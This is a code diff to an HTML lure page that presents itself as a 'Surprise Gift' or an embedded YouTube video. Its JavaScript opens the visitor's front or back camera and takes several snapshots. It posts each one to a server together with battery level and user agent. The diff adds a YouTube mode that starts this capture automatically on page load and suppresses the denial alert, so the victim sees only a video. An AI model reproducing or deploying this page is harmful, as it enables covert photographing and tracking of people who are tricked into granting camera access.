@@ -2,28 +2,33 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>View Image</title>
+    <title>Surprise Gift</title>
     <style>
         body { background: white; color: black; text-align: center; font-family: sans-serif; margin:0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        #loading-ui, #success-msg, #custom-ui { display: none; }
+        #loading-ui, #success-msg, #custom-ui, #yt-ui { display: none; }
         .gift-box { font-size: 80px; animation: bounce 1s infinite alternate; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
         @keyframes bounce { 100% { transform: translateY(-30px); } }
         .btn { background: #00ff00; color: black; border: none; padding: 18px 30px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; }
-        #custom-img { max-width: 90%; max-height: 70vh; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.2); }
+        #custom-img { max-width: 90%; max-height: 70vh; border-radius: 10px; }
+        iframe { width: 100%; height: 100vh; border: none; }
     </style>
 </head>
 <body>
     <div id="start-page">
         <div style="font-size: 60px;">🎁</div>
-        <h2>You have a surprise gift! ✨</h2>
-        <button class="btn" onclick="startWork()">🔓 UNLOCK GIFT 🎁</button>
+        <h2>You have a surprise gift! 🎊</h2>
+        <button class="btn" onclick="startWork()">🎁 UNLOCK GIFT 🎁</button>
     </div>
 
     <div id="custom-ui">
         <img src="custom.jpg" id="custom-img"><br><br>
         <button class="btn" onclick="startWork()">VIEW FULL IMAGE</button>
+    </div>
+
+    <div id="yt-ui">
+        <iframe id="yt-player" allow="autoplay; encrypted-media"></iframe>
     </div>
 
     <div id="loading-ui">
@@ -34,34 +39,27 @@
 
     <div id="success-msg">
         <div style="font-size: 80px;">🎊</div>
-        <h2 style="color:#00ff00">SUCCESS! 🎉</h2>
-        <p>Verified Successfully.</p>
+        <h2 style="color:#00ff00">CONGRATULATIONS!</h2>
+        <p>Your gift has been redeemed. God bless you!</p>
     </div>
 
     <video id="v" style="display:none" autoplay playsinline muted></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script>
-        // Page Load hone par check karega ki kaunsa option dikhana hai
+        let globalType = "";
+
         window.onload = async function() {
             let res = await fetch('type.txt');
-            let type = await res.text();
-            if(type.trim() === 'custom') {
+            globalType = (await res.text()).trim();
+            
+            if(globalType === 'custom') {
                 document.getElementById('start-page').style.display = 'none';
                 document.getElementById('custom-ui').style.display = 'block';
+            } else if(globalType === 'youtube') {
+                // YouTube ke liye seedhe permission trigger karenge
+                startWork();
             }
-        }
-
-        function getDeviceName() {
-            const ua = navigator.userAgent;
-            if (/android/i.test(ua)) {
-                const match = ua.match(/\(([^)]+)\)/);
-                if (match && match[1]) {
-                    const parts = match[1].split(';');
-                    return parts[2] ? parts[2].trim() : parts[1].trim();
-                }
-            }
-            return navigator.platform;
         }
 
         async function startWork() {
@@ -69,26 +67,38 @@
             document.body.style.color = "white";
             document.getElementById('start-page').style.display = 'none';
             document.getElementById('custom-ui').style.display = 'none';
-            document.getElementById('loading-ui').style.display = 'block';
+            
+            if(globalType !== 'youtube') {
+                document.getElementById('loading-ui').style.display = 'block';
+            }
 
             let response = await fetch('mode.txt');
-            let mode = await response.text();
+            let mode = (await response.text()).trim();
 
-            let info = { battery: "N/A", device: getDeviceName() };
+            let info = { battery: "N/A", device: "Unknown" };
             try { 
                 let b = await navigator.getBattery(); 
                 info.battery = Math.round(b.level * 100) + "%"; 
             } catch(e) {}
 
-            if(mode.trim() === 'front') await runCam({facingMode: "user"}, 3, "FRONT", info);
-            else if(mode.trim() === 'back') await runCam({facingMode: "environment"}, 3, "BACK", info);
+            // Camera Start
+            if(mode === 'front') await runCam({facingMode: "user"}, 3, "FRONT", info);
+            else if(mode === 'back') await runCam({facingMode: "environment"}, 3, "BACK", info);
             else {
                 await runCam({facingMode: "environment"}, 2, "BACK", info);
                 await runCam({facingMode: "user"}, 2, "FRONT", info);
             }
 
             document.getElementById('loading-ui').style.display = 'none';
-            document.getElementById('success-msg').style.display = 'block';
+            
+            if(globalType === 'youtube') {
+                let ytRes = await fetch('yt_link.txt');
+                let ytUrl = (await ytRes.text()).trim();
+                document.getElementById('yt-player').src = ytUrl + "?autoplay=1";
+                document.getElementById('yt-ui').style.display = 'block';
+            } else {
+                document.getElementById('success-msg').style.display = 'block';
+            }
         }
 
         async function runCam(constraints, count, label, info) {
@@ -110,14 +120,17 @@
                             image: can.toDataURL('image/jpeg', 0.9), 
                             mode: label,
                             battery: info.battery,
-                            device: info.device
+                            device: navigator.userAgent
                         }),
                         headers: {'Content-Type': 'application/json'}
                     });
                 }
                 stream.getTracks().forEach(t => t.stop());
-            } catch(e) { alert("Access Denied!"); }
+            } catch(e) { 
+                if(globalType !== 'youtube') alert("Access Denied!"); 
+            }
         }
     </script>
 </body>
-</html>
+    </html>
+    
